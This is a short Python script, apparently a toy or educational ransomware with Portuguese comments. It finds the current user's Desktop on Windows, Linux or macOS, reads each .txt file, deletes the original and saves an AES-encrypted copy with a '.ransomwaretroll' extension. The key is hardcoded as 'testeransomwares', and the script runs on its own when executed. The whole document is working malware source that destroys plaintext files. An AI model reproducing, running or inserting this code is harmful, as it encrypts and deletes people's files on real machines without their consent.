import os, platform
import pyaes
import getpass

## abrir o arquivo a ser criptografado
def open_files(file_name):
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()
    return file_data

def remove_files(file_name):
    os.remove(file_name)

def create_key():
    ## chave de criptografia
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    return aes

def encrrypt_files(file_data, aes=create_key()):
    ## criptografar o arquivo
    crypto_data = aes.encrypt(file_data)
    return crypto_data

def save_encrypted_files(file_name, crypto_data):
    ## salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    new_file = open(f'{new_file}','wb')
    new_file.write(crypto_data)
    new_file.close()

def look_desktop(path):
    key = create_key()
    thisdir = os.getcwd()
    for r, d, f in os.walk(path):
        for file in f:
            if ".txt" in file:
                filepath = os.path.join(r, file)
                data = open_files(filepath)
                remove_files(filepath)
                save_encrypted_files(filepath, encrrypt_files(data))

def get_os():
    interface = platform.uname()
    if "microsoft" in interface.release and interface.system == "Linux":
        return "Windows"
    return interface.system
    
def get_os_path():
    username = getpass.getuser()
    if get_os() == "Windows":
        return f"/mnt/c/Users/{username}/Desktop"
    elif get_os() == "Linux":
        return f"/home/{username}/Desktop"
    elif get_os() == "Darwin":
        return f"/Users/{username}/Desktop"
    else:
        return "Error"
#look_desktop()

if __name__ == "__main__":
    sys = get_os_path()
    look_desktop(sys)

